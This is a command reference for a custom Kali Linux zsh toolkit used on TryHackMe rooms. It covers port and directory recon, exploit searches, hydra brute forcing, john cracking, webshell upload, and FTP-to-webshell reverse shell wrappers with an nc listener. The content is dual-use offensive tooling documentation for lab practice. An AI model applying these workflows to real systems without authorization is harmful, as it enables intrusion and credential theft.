# Command Reference (kali-linux)

日本語: [COMMAND.md](COMMAND.md)

How to use the **custom wrappers** loaded in zsh inside the Kali container.

For flag details, each command's `-h` / `--help` is the source of truth.

**Convention:** This document uses **full command names** in the main text. Short aliases are supplementary (listed at the end of each section/table).

## Prerequisites

| Variable / Concept | Description |
|------------|------|
| `$IP` | Target IP (`target-set` / `cases/<room>/target`, auto-restored by `case-set`) |
| `case-set <room>` | Prepare and select `cases/<room>/` for a room (see "Rooms" below. alias: `cs`) |
| Recon CLI | `recon/` (inside container: `/opt/recon/recon.py`). Use through zsh wrappers |
| `recon.db` | Recon CLI database (`/opt/recon/data/recon.db`, host `recon/data/recon.db`) |
| `RECON_PASSLIST` | Default wordlist for john / hydra / stegcracker |
| `GB_VHOST_WORDLIST` | For `gb-vhost` (default: raft-small-words) |
| `GB_DNS_WORDLIST` | For `gb-dns` (`gb-set-dns`) |
| `GB_THREADS` | gobuster threads for `gb-dns` / `gb-vhost` (default 40) |
| `SCOUT_STATUS_SLOTS` | Max number of **completed dirs jobs** shown by `scout -s` / `-ws` (default **4**) |
| `CASE_LOOSE=1` | Fallback to `cases/_unscoped/` when room is unset |
| `CASE_ROOT` | `/workspace/cases` (parent of `CASE_HOME`) |
| `RECON_DATA` | `/opt/recon/data` (DB directory) |
| `RECON_DB` / `RECON_DB_PATH` | `/opt/recon/data/recon.db` |

```bash
case-set startup
target-set 10.49.140.156
# In another tab (if cwd is cases/startup/):
case-sync                 # or just target-set (reload target)
target-show
```

Raw OpenSSH / ftp clients: `command ssh ...` / `command ftp ...`

---

## workspace (`/workspace`)

Host `./workspace` is mounted to container `/workspace`.

| Path | Contents |
|------|------|
| `cases/<room>/` | Files per TryHackMe room (see below) |
| `exploits/` | Downloaded PoCs / third-party exploits (not room-specific) |
| `payloads/` | Custom payloads (webshell, etc. `upload-shell` default is `payloads/webshells/shell.phtml`) |

Structured data goes to Recon CLI -> `recon.db`; shell logs, cracking output, and handwritten notes go to `cases/<room>/` (`logs/` `exports/` or room root).

---

## Rooms (`cases/`)

`case-set` is **not only cd**. It **creates and selects** a working directory for one TryHackMe room (or one scope) (alias: `cs`).

### What `case-set <room>` does

1. **Create directories** - if missing, `mkdir -p`
   `/workspace/cases/<room>/`
   and required subdirectories `logs/` `exports/`
2. **Session variables** - `CASE=<room>`, `CASE_HOME=/workspace/cases/<room>`
3. **Working directory** - `cd "$CASE_HOME"`
4. **On-enter hook** (`_case-on-enter`)
   - If `cases/<room>/target` exists -> load `$IP`
   - If `cases/<room>/ftp-shell` exists -> load path for `ftp-revshell` (with message)

**Not auto-created** (place manually if needed): `target`, `ftp-shell`, `memo.md`, files pulled from the room like `*.jpg`, etc.
Those can be placed directly under `CASE_HOME`.

**When TryHackMe IP changes:** `target-set <newIP>` — auto-inherit when the previous target has recon data; older IPs accumulate in `cases/<room>/lineage` (3+ reboots stay in scope). `exec-list` / `creds-list` / `scout -r` use **lineage + current IP** as recon scope. Pivot: `target-set <ip> --new` (clears lineage). Manual pick: `target-set <ip> --pick` or `case-ips` for the list.

```bash
case-set startup
# [+] case: startup
# [+] path: /workspace/cases/startup
# [+] target: 10.49.140.156  (.../target)   # if target exists
# [+] ftp-shell: .../ftp-shell               # if it exists
```

### Directory example (after first `case-set startup`)

```
/workspace/cases/startup/
├── logs/          # always created by case-set (listen -l, ssh -l, etc.)
├── exports/       # always created by case-set (steg-extract, john output, etc.)
├── target         # created by target-set (optional but recommended)
├── hosts          # hosts command (THM vhost → auto-apply /etc/hosts)
├── ftp-shell      # optional (room-specific FTP/HTTP path)
└── ...            # downloaded files, MEMO.md, locks.txt, etc. can be placed at root
```

### Other commands

| Command | Description |
|----------|------|
| `case-show` | Current `CASE` / `CASE_HOME` / `target` / `load_from` / `lineage` |
| `case-ips` | Case IP list (lineage / scope / activity; `+` = in lineage, `*` = load_from) |
| `case-load <ip\|--new\|--pick>` | Keep current IP, change inherit source (lineage) only |
| `case-clear` | Unset `CASE` / `CASE_HOME` (does not delete directories) |
| `case-reset [-y] [<room>]` | **Wipe room** — delete all files under `cases/<room>/` (recreate empty `logs/` `exports/`) + recon DB rows for the room |
| `case-open` | Re-enter `CASE_HOME` without changing room |

### Room naming rules

- Must start with alphanumeric, rest can be alphanumeric / `.` / `_` / `-`
- `_unscoped` is reserved (fallback when `CASE_LOOSE=1`)

### When room is not set

Commands with **file output** like `listen -l`, `ssh -l`, `steg-extract` require `CASE_HOME` via `case-home`.
If unset -> error. With `export CASE_LOOSE=1`, output falls back to `cases/_unscoped/` with warning.

---

## Target IP

| Command | Description |
|----------|------|
| `target-set <ip>` | Save to `cases/<room>/target` and set `$IP`. On IP change, **auto-inherit** when recon data exists for previous target (alias: `ts`) |
| `target-set` | Reload `$IP` from `target` (can infer room if cwd is under `cases/<room>/`) |
| `target-set <ip> --new` | Pivot - no load_from (do not inherit old IP scan/dirs) |
| `target-set <ip> --pick` | Select inheritance source IP by number (last_seen + open/dirs count) |
| `case-sync` | If `$PWD` is under `cases/<room>/`, restore `CASE` + `$IP` (for another tab) |
| `target-show` | Current IP |
| `target-clear` | Clear IP |
| `hosts <ip> <host> [aliases...]` | Write `cases/<room>/hosts` and apply `/etc/hosts` (`hosts -h`) |
| `hosts` / `hosts --off` / `hosts -e` | Show / remove recon block / edit (auto on `case-set`) |
| `scout [ip]` | **First recon action** (orchestrator). See "Recon (scout)" below |
| `scan [ip]` | nmap **top 1000** (`-sC -sV`) -> DB, prints **OPEN + CLOSED** at end |
| `scan -f` / `scan --full` | **TCP 1-65535 automatically to completion** (single command end-to-end) |
| `scan -f -j 4` | Run full scan in **4 parallel jobs** (up to 4000 ports per wave, merged with `recon.db.lock`) |
| `scan --force` | Re-scan (basic=top 1000, full=`-p-`) |
| `scan -r` / `scan --report` | Print DB OPEN + CLOSED only (same shape as post-`scan`, no nmap) |
| `scan -n` / `-q` | dry-run / hide port table |
| `host-reset [ip]` | Remove ports / coverage / scan_ranges for that IP (for retesting) |
| `host-view [ip]` | Full ports, tasks, history, artifacts |

```bash
case-set startup && target-set 10.49.140.156
scout             # first recon action (scan -> probes -> dirs BG -> auto watch until dirs done)
scout -r          # recon summary (ports + probes + PATHS, no re-run)
scout -s            # dirs status (one-shot)
scout -ws           # auto-refresh status only until done (pair of -s)
exec-list && exec-view <id>     # output of synchronous probes
scan              # ports only (classic top 1000)
scan -f           # auto through all 65535
scan -f -j 4      # 4-way parallel (2-4 recommended on THM, can stop with Ctrl+C)
host-reset        # delete scan results only, then retry
scan -r           # print only port table again (lightweight)
host-view         # only when you need tasks/history
```

coverage is **per port number** (`scan`-covered ports are skipped even in `scan -f`). Port recon is only via **`scan` / `scan -f` / `scan -r`**.

---

## Recon (scout)

**Recon orchestrator** (alias: `s`). Executes port scan, service probes, and directory discovery in order. Exploitation and full room completion are out of scope.

| Command | Description |
|----------|------|
| `scout [ip]` | Run Phase 1-3 + **exploit search**. **After dirs dispatch, auto-watch like `-ws`** (ends when running=0) |
| `scout -r` / `--report [ip]` | Recon summary from DB (**room-merged** ports + **OS** + probes + **PATHS** + **HINTS** + **EXPLOITS**). No re-run |
| `scout -rp` / `--report-ports [ip]` | **OPEN + CLOSED** only (DB) |
| `scout -re` / `--report-exploits [ip]` | **EXPLOITS** only (DB, no re-search) |
| `scout -ep` / `--exploit-pack [ip]` | **AI submission pack** — refresh searchsploit + Metasploit, save Markdown under `cases/<room>/plans/` (prints paths only) |
| `scout -rt` / `--report-paths [ip]` | **PATHS** tree only (DB, merged dirs hits) |
| `scout -se` / `--search-exploits [ip]` | Run and cache searchsploit |
| `scout -r -se [ip]` | Search first, then full report |
| `scout -d` / `scout --dirs [path] [ip]` | gobuster dir only. `-d /admin` -> `http://$IP/admin/`. **Auto-watch to completion** |
| `scout -d -x <ext> [path]` | Extension fuzz (`-x` only uses catalog **dirs-ext** default: `common`) |
| `scout -d -w <id>` | Catalog id (e.g. `dirbuster-small`) or absolute path |
| `scout -d` (`-w` omitted) | Catalog default (`common`, etc.) |
| `scout -d -w` | Interactive picker (`-x` switches dirs / dirs-ext) |
| `scout -d -w browse` | Browse all categories |
| `scout -ds` / `-ds [path]` | **Parallel dir** - up to **standard** tier (3 jobs cumulative) |
| `-ds -x <ext>` | ext fuzz - up to **standard** tier (2 jobs cumulative) |
| `scout -ds -p next [path]` | Only add next-tier jobs (skip already completed jobs) |
| `scout -ds -p light\|standard\|wide\|deep` | Cumulative up to specified tier |
| `scout -ds -w id -w id` | Parallel with explicit ids only |
| `scout -d -H <hostname>` / `-ds -H <name>` | vhost dir bust — `http://$IP/` + gobuster `-H Host:<name>` (no `/etc/hosts` needed) |
| `scout -d mafialive.thm` | dotted FQDN is treated like `-H` (not as `/mafialive.thm/` path) |
| `scout -s` / `--status [ip]` | Show dirs job status **once** |
| `scout -ws` / `--wait-dirs [sec]` | Auto-refresh dirs status. **Ends when running=0** (pair of `-s`) |
| `scout -n` | Show command plan without execution |
| `scout --force` | Re-scan Phase 1 and re-dispatch Phase 3 dirs (**not needed for `-se`** - `-se` always refreshes) |

**Prerequisite:** `$IP` or `[ip]`. Web exploration targets ports marked **open** in DB and with **web-like service** (`http` / `https` / `nginx`, etc.). `scout -d` requires Phase 1 already done (run `scout` first if not scanned).

### Phase 1 - Port scan

Internally runs `scan` once (top 1000, `-sC -sV`). Results are recorded in `recon.db` ports / coverage.

### Phase 2 - Service probes (synchronous)

Scans **all open ports**, and runs short probes only where DB **service** matches **SSH / Web type** (and ftp) (not fixed to 22/80; tomcat on 8080 is included).

| service (examples) | Probe |
|---------------|----------|
| `ssh` | nmap `ssh2-enum-algos` |
| `ftp` (excluding `sftp`) | `curl` ftp |
| Web-like (`http` / `nginx` / `apache` / `tomcat`, etc.) | `curl` |

Ports with unknown service are skipped (probe results do not overwrite service). Output goes to console and **`executions`** (`exec-list` / `exec-view`). `task_type`: `scout-ssh`, `scout-http`, `scout-https`, `scout-ftp`.

**Re-run behavior:** For same `ip` + **command**, if a previous run **succeeded** (`done`, `exit_code=0`), it does not rerun and shows `(cached)`. URL normalization treats `http://IP/` and `http://IP:80/` as same, and `https://IP/` and `https://IP:443/` as same. Non-standard ports (e.g. `:8080`) remain separate probes. **`scout --force` does not affect probes** (dirs / scan / exploit only).

### Phase search-exploits - searchsploit (synchronous)

After Phase 2 (during normal `scout` run), runs `searchsploit -j` using `service` / `version` (nmap `product` + `version` + `extrainfo`) from **open ports**. DoS / PoC are excluded via `--exclude`, and up to **5** prioritized **remote / webapps** items per port are saved to `artifacts` as `exploit_report` JSON.

**No re-search needed for EXPLOITS in `scout -r`:** each candidate includes **title / absolute path / run command / `searchsploit -m EDB`**. Raw JSON remains in `exec-view <id>` (`executions` cache).

If you tried a candidate and confirmed it is not applicable, reject it manually to hide it from `scout -re` / `scout -r` (untested items remain visible).

```bash
exploit-reject 50383                      # hide EDB-50383 (for $IP)
exploit-reject --port 80/tcp 50383        # port-scoped
exploit-reject 50383 --note "400 Bad Request"
exploit-rejects                           # list rejects
exploit-unreject 50383                    # restore
```

(alias: `erj` / `erl` / `eru`)

Rejects persist even after re-search with `scout -se`.

| Input example | searchsploit query |
|--------|---------------------|
| `http` + `Apache httpd 2.4.49` | `Apache httpd 2.4.49` |
| `mysql` + `5.7.33` | `5.7.33` or product line |
| `http` only (product unknown) | Skip (too broad) |

`task_type`: `scout-exploit`. Detailed stdout is in `exec-view <id>`. Summary appears under `--- EXPLOITS ---` in **`scout -r`**.

```bash
scout -se                # searchsploit -> cache
scout -re                # show cached EXPLOITS
scout -rp                # ports only
scout -r                 # full report
scout -r -se             # search, then full report
scout -se                # explicit re-search after searchsploit -u, etc. (always refresh)
```

### Phase 3 - Directory discovery (asynchronous)

After Phase 1, if web-like open ports exist, starts gobuster dir **in background** **per port** (e.g. 80 and 8080 both web -> 2 parallel jobs).

- **Default wordlist:** when **`-w` is omitted**, use catalog default. **`-w` only** opens picker.
- **Logs:** `cases/<room>/logs/` (same naming convention as `gb-dirs`).
- **Job management:** `scout_jobs` in `recon.db` (type, URL, status, log path). For same **URL + wordlist**, if a job is **running** or **done**, do not dispatch again (`http://IP/` and `http://IP:80/` are equivalent. use **`scout --force`** to rerun). **`-x` (extensions) is not part of cache key** - to run same wordlist with different extensions, `--force` is required (e.g. rerun `common` with `-x ticket` after already doing `-x html`).
- **Console:** no real-time gobuster stream. After `scout` / `scout -d`, **dirs watch starts automatically** (`-ws` equivalent). For ad-hoc checks, use **`scout -s`** / **`scout -ws`**.

```bash
scout
scout -r
scout -s
scout -ws
scout --dirs -w dirbuster-small -t 20
scout -d /admin
scout -d /admin -x bak,old,txt
scout -d /assets -x php,bak -t 50 -w dirbuster-small
scout -d /admin -x ticket
scout -d /admin -x ticket -w
scout -d /admin -x ticket -w dirbuster-small
scout -d /admin -w browse
scout -d http://$IP:8080/
scout -d -H mafialive.thm
scout -ds -H mafialive.thm /admin
scout -ds /assets
scout -ds -p next /assets
scout -ds -p wide /uploads
scout -ds -x php /backup
scout -ds -x bak -p next /api
scout -ds -p deep -t 10
scout --force              # redo dirs / scan
```

### PATHS in `scout -s` / `-ws` / `-r` / `-rt`

`-s` / `-r` / **`-rt`** show **job list (metadata)** and **PATHS (merged tree)** separately (`-rt` shows PATHS only).

| Block | Content |
|----------|------|
| **jobs** | id, URL, wordlist name, status, pid, log path (no hit body shown) |
| **`--- PATHS ---`** | Merge dirs hits from shown jobs into a **site-root-based hierarchical tree** |

Jobs in `-s` are ordered as **completed first from oldest** (newest lower), and **running always at the end**. Display limit for completed jobs is **`SCOUT_STATUS_SLOTS`** (default **4**, tune to your parallel dirs count). Hidden overflow is shown as `N older hidden` in header.

PATHS in `-r` / `-rt` merge only the **latest dirs job per URL** (no re-execution, DB-only).

**PATHS example** (merged from root dirs + `-d /etc/`):

```
--- PATHS ---
http://10.49.140.183/
  admin/  301
  etc/  301
    squid/  301
```

Numbers are gobuster HTTP status. Only 200 / 301 / 302 / 401 are shown (noise and extension fuzz are excluded).

### How to read outputs

| Type | How to check |
|------|----------|
| Recon summary (ports + PROBES + PATHS + HINTS + EXPLOITS) | **`scout -r`** |
| Ports only | **`scout -rp`** |
| PATHS tree only | **`scout -rt`** |
| exploit list (DB) | **`scout -re`** |
| AI submission pack (searchsploit + MSF) | **`scout -ep`** |
| exploit search (refresh cache) | **`scout -se`** / **`scout -r -se`** |
| scan and synchronous probes | Console, `exec-list` / `exec-view` (probe shows `(cached)` if already successful) |
| directory discovery (jobs + PATHS tree) | **`scout -s`** / **`scout -ws`**, log files |

For manual gobuster runs, use **`scout -ds`** (parallel) or **`scout -d`** (single wordlist).

---

## Hints / Notes (recon DB)

Save strings, codewords, and "investigate later" notes from pages into DB **per room (`CASE`)**. If `case-set` is done, IP is not required. Also appears in **HINTS** section of `scout -r`.

| Command | Description |
|----------|------|
| `hint-add [-t tag] text...` | Save hint (alias: `ha`) |
| `hint-list` | List hints with id (alias: `hl`) |
| `hint-rm <id>` | Delete hint (alias: `hr`) |

```bash
case-set lianyu
hint-add go!go!go!
hint-add -t codeword vigilante
hint-add -t island-page 'The Code Word is: </p><h2 style="color:white"> vigilante</style><'
hint-list
scout -r          # shown under --- HINTS --- (when CASE is set)
hint-rm 3         # delete id=3
```

`-t` / `--tag` is an optional label. Same room + tag + body is deduplicated.

---

## Credentials (recon DB)

| Command | Description |
|----------|------|
| `creds-add [ip] <user> <pass>` | Manual add (alias: `ca`. for `???` etc, use `noglob`. run `exec zsh` after update) |
| `creds-list [ip]` | List creds. **If `case-set` is active: load_from + current IP** (with IP column). `creds-list --all-case` lists all IPs in room (alias: `cl`) |
| `creds-rm [ip] [user]` | Remove creds (omit user to remove all for IP. alias: `cr`. for `?` etc, use `noglob`) |
| `hydrassh [-p port] [ip] <user> [wordlist]` | hydra SSH -> add to DB on success (`hydrassh -h`) |
| `hydraftp [ip] [user] [wordlist]` | hydra FTP (default user: anonymous) |
| `hydraweb ...` | for http-post-form (see `hydraweb -h`) |
| `hydrabasic [-p port] [ip] <user> [path] [wordlist]` | HTTP Basic Auth (hydra http-get, `hydrabasic -h`) |

Automatic login for `ssh` excludes **anonymous** (FTP anonymous saved by `ftpa`).

---

## SSH

| Command | Description |
|----------|------|
| `ssh [user] [ip]` | Connect using DB creds + `sshpass` |
| `ssh -i <key> [user] [ip]` | Key-based login (passphrase loaded from creds) |
| `ssh -l` / `ssh --log` | Log session to `cases/.../logs/ssh_*` |
| `ssh-list [ip]` | List creds (same style as `creds-list`) |
| `ssh-get` | **scp download** using creds from `creds-list` (`-o` destination, `-r` recursive. alias: `sget`) |

**Note:** `-l` is for **log save**, not OpenSSH login user. Specify user as argument, e.g. `ssh holt`.

```bash
ssh-get tryhackme.asc credential.pgp
ssh-get -o workspace/cases/tomghost ~/tryhackme.asc
ssh-get skyfuck ~/credential.pgp
```

---

## FTP

| Command | Description |
|----------|------|
| `ftp [user] [ip]` | Connect with DB creds |
| `ftp -l` | Session log |
| `ftpa [ip]` | Anonymous FTP (`anonymous` / `anonymous@` saved to DB) |
| `ftpa -l` / `ftp -l` | Session log (`cases/.../logs/`) |
| `ftp -A <host>` | Anonymous mode (`ftpa`-style, different from OpenSSH `-A`) |

---

## Listener / RCE trigger

| Command | Description |
|----------|------|
| `listen [port]` | `nc -lvnp` (default 4444) |
| `listen -l [port]` | Save connection log to `cases/.../logs/revshell_*` |
| `webrsh [options] [path\|url]` | Web RCE -> reverse shell (`?cmd=` / POST). LHOST auto-detect: `tun0` -> `eth0` |

Before `ftp-revshell`, start `listen` in **another terminal**.

---

## FTP -> webshell -> reverse shell

| Command | Description |
|----------|------|
| `ftp-put-shell [opts] [ip]` | Upload payload via FTP put -> print URL |
| `ftp-revshell` | put + `webrsh` for reverse shell (alias: `ftprsh`) |
| `ftp-revshell -u` | Skip upload (use URL of already uploaded shell only) |

### Common options

| Option | Meaning |
|------------|------|
| `-d <dir>` | Subdirectory on FTP (e.g. `ftp`) |
| `-w <prefix>` | HTTP path prefix (e.g. `/files`) |
| `-U <url>` | Full shell URL (skip path calculation) |
| `-n <name>` | Remote filename (default `shell.php`) |
| `-p <path>` | Local payload path |
| `-P <port>` | Reverse shell port (default 4444) |

### Per-room settings

`cases/<room>/ftp-shell` (auto-loaded by `case-set`):

```bash
REMOTE_DIR=ftp
WEB_PREFIX=/files
```

Example (Startup): `http://$IP/files/ftp/shell.php`

Default without config: `ftp://$IP/shell.php` -> `http://$IP/shell.php`

```bash
case-set startup
listen 4444          # another terminal
ftp-revshell
# or
ftp-revshell -d ftp -w /files
ftp-revshell -U http://10.49.140.156/files/ftp/shell.php -u
```

Details: `ftp-revshell -h`

---

## steghide

| Command | Description |
|----------|------|
| `steg-extract <image> [wordlist]` | info -> empty PW -> stegcracker -> extract (alias: `stegx`) |

Output: `cases/<room>/exports/<name>.steg.out` (if room unset, output next to the image)

Logs: `cases/<room>/logs/steg_*`

Manual commands -> [CHEATSHEET.en.md](CHEATSHEET.en.md)

---

## Recon CLI (DB / scan / tasks)

| Command | Description |
|----------|------|
| `recon-init` | Initialize `recon.db` |
| `net-scan <cidr>` | Network scan -> DB |
| `net-view` | List registered hosts |
| `scout [ip]` | Recon orchestrator. `scout -r` / `scout -d` / `scout -s` / `scout -ws` |
| `host-view [ip]` | Host details |
| `host-summary [ip]` | JSON summary |
| `task-view` | Task list |
| `task-done <id>` | Mark task done |
| `task-run <id>` | Run task |
| `host-run-next [ip]` | Run next pending task |

## Execution history / artifacts

| Command | Description |
|----------|------|
| `exec-run [ip] <cmd...>` | Run command with record (alias: `x`) |
| `exec-run -s [ip] <cmd...>` | Silent mode (suppressed output bias. alias: `xs`) |
| `exec-cache [ip] <cmd...>` | With cache (same ip+cmd can be reused. alias: `xc` / `xcs` is with `-s`) |
| `exec-list [ip]` | Execution list. **If `case-set` is active: load_from + current IP** (reboot inheritance). `exec-list --all-case` lists all room IPs, `exec-list -l` all hosts (alias: `el`) |
| `exec-view <id> [--tail N]` | Show output (alias: `ev`) |
| `exec-form <id> [--shell]` | Parse upload form from execution stdout |
| `artifact-add [ip] <kind> <value> [key]` | Add artifact |
| `artifact-list [ip]` | List artifacts (`artifact-list -l` lists all hosts. alias: `al`) |
| `artifact-del <id>` | Delete artifact |

Example: `exec-run curl -sS http://$IP/` -> `exec-view <id>` -> `upload-shell <id>`

---

## Gobuster

In recon flow, **`scout -d`** (single) / **`scout -ds`** (parallel) are the proper dir discovery commands. Use these for DNS / vhost:

| Command | Description |
|----------|------|
| `scout -d [path]` | Single wordlist (catalog default / `-w` / picker) - see "Recon (scout)" above |
| `scout -ds [path]` | Parallel dir (default: standard tier; upgrade with `-p next`) |
| `gb-dirs [opts] [url]` | **Deprecated** - delegated to `scout -ds` |
| `gb-dns [domain]` | DNS |
| `gb-vhost ...` | vhost |

Omitting **`-p`** in `-ds` = cumulative up to **standard** tier. **`-p next`** = only add next-tier jobs.

| tier | dirs (without `-x`) cumulative | dirs-ext (`-x`) cumulative |
|------|----------------------|---------------------|
| light | common, quickhits | common |
| standard | + raft-small-directories | + dirbuster-small |
| wide | + raft-small-files | + dirbuster-medium |
| deep | + dirbuster-small, raft-small-words | + raft-small-files |

aliases: `fast->light`, `ctf->standard`. Legacy dirs `-p deep` (4 jobs) is now **`wide`**.

Interactive DNS wordlist selection:

| Command | Description |
|----------|------|
| `gb-set-dns` | Select `GB_DNS_WORDLIST` |

```bash
case-set overpass
scout -d /admin -x php -w dirbuster-small
scout -ds /admin
scout -ds -p next /assets
scout -ds -x php /backup
scout -ds -p wide -n
gb-vhost              # both http + https
gb-dns example.com
```

---

## Cracking (john)

| Command | Description |
|----------|------|
| `sshkey-crack [-f] [-u user] <key> [wordlist]` | ssh2john + john -> `creds-add` on success |
| `gpg-crack [-f] [-n] [-c cred.pgp] <key.asc> [wordlist]` | gpg2john + john -> decrypt `credential.pgp` -> add plaintext `user:pass` via `creds-add` |
| `hash-crack [-f] [-b] [-u user] <hash\|file\|url> [wordlist]` | Hash string/file/URL to john (htpasswd, etc.). `-b` saves creds as `borg@$IP` |
| `zip-crack <zip> [wordlist]` | zip hash |
| `borg-crack [-n] [-u user] [-p pass] <dir> [pass]` | Detect Borg repo in directory -> `borg extract` all archives |

```bash
hash-crack -b http://$IP/etc/squid/passwd   # creds-list: borg@$IP
borg-crack <dir>                            # auto-use borg from creds-list
borg-crack -u <user> <dir>
borg-crack -p <passphrase> <dir>
```

Extraction target: `exports/<repo_name>/borg/` (`case-set` required). If `-u` is omitted, `borg-crack` prioritizes **`borg` from creds-list** (`RECON_BORG_CREDS_USER`).

---

## Web upload (form POST)

| Command | Description |
|----------|------|
| `upload-shell [opts] [<exec_id>\|]<url>` | multipart POST of `shell.phtml` (alias: `upsh`) |
| `exec-form <exec_id>` | Preview form fields from HTML seen in `exec-view` |
| `shell-url` / `shell-cmd` | Build URL / test `?cmd=` |

Default payload: `/workspace/payloads/webshells/shell.phtml`

```bash
exec-run curl -sS http://$IP/panel/
upload-shell 63
```

See `upload-shell -h`.

---

## enc (Base64 / Base32 / Base58 / Base10)

| Command | Description |
|----------|------|
| `enc -d <str>` / `... \| enc -d` | Try and decode b10 + b64 + b32 + b58 |
| `enc -e <str>` | Encode in all formats |
| `enc -t b10 -d <digits>` | decimal integer -> byte sequence (ASCII) |
| `enc -t b10 -e <str>` | string -> decimal integer |
| `enc -t b64 -d <str>` | Base64 only |
| `enc -t b32 -d <str>` | Base32 only |
| `enc -t b58 -d <str>` | Base58 only |

If `-t` is omitted, all types are tried. b10 works for input with **0-9 only**. `enc -d` (alias: `dec`).
Legacy names `b64d` `b64e` `b32d` `b32e` `b58d` `b58e` `b10d` `b10e` are aliases. `enc -h`

## rot (Caesar / ROT)

| Command | Description |
|----------|------|
| `rot -a <str>` / `rot -a -f <file>` / `... \| rot -a` | Show all shifts 0-25 |

`rot -a 'MAF{...}'` -> find the line with `THM{` (shift 7). Legacy name `rotall`. `rot -h`

## vig (Vigenere)

| Command | Description |
|----------|------|
| `vig -a <cipher>` | Brute-force key lengths 1-3 (only likely-flag lines) |
| `vig -a --all <cipher>` | No filtering |
| `vig -a -n 4 <cipher>` | Max key length (4+ is slow) |
| `vig -d -k KEY <cipher>` | Decrypt |
| `vig -e -k KEY <plain>` | Encrypt |
| `vig -K -p PLAIN <cipher>` | Recover key from known plaintext |

`vig -a 'CIPHER{...}'` -> `key THM: TRYHACKME{...}`. If wrapper text is known, `vig -K -p TRYHACKME '...'` -> `THM`.
Supports `-f` / pipes. Legacy `vigd` `vige` `vigall` `vigkey` are aliases. `vig -h`

## Magic byte repair

| Command | Description |
|----------|------|
| `fixmagic <file>` | Check magic byte and repair only if needed |
| `fixmagic -o out.png <file>` | Specify output path |
| `fixmagic -n <file>` | Check only (no repair) |
| `fixmagic -i <file>` | In-place only when needed (keeps `.bak`) |

If no repair is needed, exits with `[=] ok`. Supports PNG / JPEG / GIF.
`fixmagic broken.png` - if broken, writes `broken_fixed.png`; if valid, writes nothing. `fixmagic -h`

---

## Aliases

### Wrappers

| Full command | alias |
|--------------|-------|
| `case-set` | `cs` |
| `target-set` | `ts` |
| `scout` | `s` |
| `creds-add` | `ca` |
| `creds-list` | `cl` |
| `creds-rm` | `cr` |
| `exec-run` | `x` |
| `exec-run -s` | `xs` |
| `exec-cache` | `xc` |
| `exec-cache -s` | `xcs` |
| `exec-list` | `el` |
| `exec-view` | `ev` |
| `artifact-list` | `al` |
| `hint-add` | `ha` |
| `hint-list` | `hl` |
| `hint-rm` | `hr` |
| `ssh-get` | `sget` |
| `ftp-revshell` | `ftprsh` |
| `upload-shell` | `upsh` |
| `steg-extract` | `stegx` |
| `exploit-reject` | `erj` |
| `exploit-rejects` | `erl` |
| `exploit-unreject` | `eru` |
| `postcmd` | `pcmd` |
| `enc -d` | `dec` |
| `pop3` | `p3` |
| `pop3-list` | `p3l` |
| `pop3-get` | `p3g` |
| `pop3-dump` | `p3d` |

### Others

| Command | alias |
|----------|-------|
| `ss -tulnp` | `ports` |
| `python3 -m http.server 8000` | `http` |
| `searchsploit` | `ss` |
| `msfconsole` | `msf` |
| `tmux new -A -s ctf` | `t` |
| `dig @1.1.1.1 +short A` | `diga` |
| `dig @1.1.1.1 +short MX` | `digmx` |
| `dig @1.1.1.1 +short TXT` | `digtxt` |
| `dig @1.1.1.1 +short NS` | `digns` |

---

## Not documented for users

Internal helpers (not for direct use): `ftp-login`, `ssh-login`, `target-load`, `case-home`, `_revshell-lhost`, etc.
`python3 $RECON_APP ...` should be invoked through the zsh commands above.

---

## Help list

```bash
ftp-revshell -h
ssh -h
listen -h
steg-extract -h
gb-dirs -h
sshkey-crack -h
gpg-crack -h
upload-shell -h
webrsh -h
postcmd -h
enc -h
rot -h
vig -h
fixmagic -h
ftp -h
ftpa -h
hydraweb   # shows usage when args are missing
hydrabasic -h
```

## Index (user-facing commands)

Full names only. Alias is shown in parentheses.

`case-set` (`cs`) `case-show` `case-clear` `case-reset` `case-open` `case-sync` `case-load` ·
`target-set` (`ts`) `target-show` `target-clear` ·
`scout` (`s`) `scout -r` `scout -rp` `scout -re` `scout -ep` `scout -rt` `scout -se` `scout -d` `scout -ds` `scout -s` `scout -ws` ·
`scan` `host-reset` `host-view` ·
`creds-add` (`ca`) `creds-list` (`cl`) `creds-rm` (`cr`) `hydrassh` `hydraftp` `hydraweb` `hydrabasic` ·
`hint-add` (`ha`) `hint-list` (`hl`) `hint-rm` (`hr`) ·
`ssh` `ssh-list` `ssh-get` (`sget`) · `ftp` `ftpa` · `listen` `webrsh` · `ftp-revshell` (`ftprsh`) `ftp-put-shell` ·
`steg-extract` (`stegx`) · `recon-init` `net-scan` `net-view` `host-summary` ·
`task-view` `task-done` `task-run` `host-run-next` ·
`exec-run` (`x`) `exec-cache` (`xc`) `exec-list` (`el`) `exec-view` (`ev`) `exec-form` ·
`artifact-add` `artifact-list` (`al`) `artifact-del` ·
`exploit-reject` (`erj`) `exploit-rejects` (`erl`) `exploit-unreject` (`eru`) ·
`gb-dirs` `gb-dns` `gb-vhost` `gb-set-dns` ·
`sshkey-crack` `gpg-crack` `hash-crack` `zip-crack` `borg-crack` · `upload-shell` (`upsh`) `postcmd` (`pcmd`) `shell-url` `shell-cmd` ·
`pop3` (`p3`) `pop3-list` (`p3l`) `pop3-get` (`p3g`) `pop3-dump` (`p3d`) `hydrapop3` ·
`enc` (`dec`) `rot` `vig` `fixmagic` · `ports` `http` `ss` `msf` `t` `diga` `digmx` `digtxt` `digns`
